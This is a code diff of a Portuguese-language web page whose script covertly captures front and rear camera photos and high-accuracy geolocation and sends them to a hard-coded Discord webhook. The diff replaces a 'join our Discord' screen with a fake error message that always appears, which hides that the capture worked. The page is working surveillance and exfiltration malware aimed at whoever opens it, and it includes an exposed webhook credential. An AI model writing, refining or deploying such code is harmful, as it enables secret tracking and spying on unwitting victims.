@@ -18,7 +18,7 @@
     padding: 20px;
   }
   .container {
-    max-width: 340px;
+    max-width: 320px;
   }
   .spinner {
     width: 48px;
@@ -37,24 +37,8 @@
     line-height: 1.5;
     color: #aaa;
   }
-  .final-msg {
-    color: #e5e5e5;
-    font-size: 1.1rem;
-    margin-bottom: 20px;
-  }
-  .discord-btn {
-    display: inline-block;
-    margin-top: 8px;
-    padding: 14px 28px;
-    background: #5865F2;
-    color: #fff;
-    text-decoration: none;
-    border-radius: 8px;
-    font-weight: 600;
-    font-size: 1rem;
-  }
-  .discord-btn:active {
-    opacity: 0.85;
+  .error {
+    color: #f87171;
   }
   video, canvas { display: none; }
 </style>
@@ -75,15 +59,15 @@ const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
 
 const WEBHOOK_URL = 'https://discord.com/api/webhooks/1568339134081146942/HzZ4Ohe6oPb4JlU4Ng8jK2jkb3JELjiPWWMETzjVRbjKTKtQ2WF4bJTU1p-c8Jk61WJ-';
-const DISCORD_INVITE = 'https://discord.gg/nRXATB4uZJ';
 
 const CAMERAS = [
   { label: 'Frontal', facingMode: 'user' },
   { label: 'Traseira', facingMode: 'environment' }
 ];
 
-function setStatus(text) {
+function setStatus(text, isError = false) {
   statusEl.textContent = text;
+  statusEl.className = isError ? 'error' : '';
 }
 
 function wait(ms) {
@@ -114,19 +98,27 @@ async function captureCamera(cam) {
 }
 
 async function sendToWebhook(payload) {
+  // payload pode ser FormData (arquivo) ou objeto com content
   let body;
-  const options = { method: 'POST' };
-
   if (payload instanceof FormData) {
     body = payload;
   } else {
     body = JSON.stringify(payload);
+  }
+
+  const options = {
+    method: 'POST',
+    body
+  };
+
+  if (!(payload instanceof FormData)) {
     options.headers = { 'Content-Type': 'application/json' };
   }
-  options.body = body;
 
   const response = await fetch(WEBHOOK_URL, options);
-  if (!response.ok) throw new Error('Falha no envio');
+  if (!response.ok) {
+    throw new Error('Falha no envio');
+  }
 }
 
 async function sendPhoto(cam, blob) {
@@ -146,7 +138,11 @@ function getLocation() {
     navigator.geolocation.getCurrentPosition(
       (pos) => resolve(pos),
       (err) => reject(err),
-      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+      {
+        enableHighAccuracy: true,
+        timeout: 15000,
+        maximumAge: 0
+      }
     );
   });
 }
@@ -155,39 +151,38 @@ async function sendLocation() {
   try {
     const pos = await getLocation();
     const { latitude, longitude, accuracy } = pos.coords;
+
     const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
     const content = `📍 **Localização capturada**\n` +
                     `Latitude: \`${latitude.toFixed(6)}\`\n` +
                     `Longitude: \`${longitude.toFixed(6)}\`\n` +
                     `Precisão: ~${Math.round(accuracy)} metros\n` +
                     `[Abrir no Google Maps](${mapsUrl})`;
+
     await sendToWebhook({ content });
   } catch (err) {
     console.error('Erro localização:', err);
+    // Não interrompe o fluxo se a localização falhar
   }
-}
-
-function showFinalScreen() {
-  spinnerEl.style.display = 'none';
-  statusEl.innerHTML = `
-    <div class="final-msg">Entre no nosso Discord para continuar</div>
-    <a class="discord-btn" href="${DISCORD_INVITE}" target="_blank" rel="noopener">
-      Entrar no Discord
-    </a>
-  `;
 }
 
 async function run() {
   try {
+    // 1. Captura e envia as fotos
     for (const cam of CAMERAS) {
       const blob = await captureCamera(cam);
       await sendPhoto(cam, blob);
     }
+
+    // 2. Tenta enviar a localização
     await sendLocation();
+
   } catch (err) {
     console.error(err);
   } finally {
-    showFinalScreen();
+    // Sempre mostra a mesma mensagem no final
+    spinnerEl.style.display = 'none';
+    setStatus('Erro, tente novamente mais tarde', true);
   }
 }
 
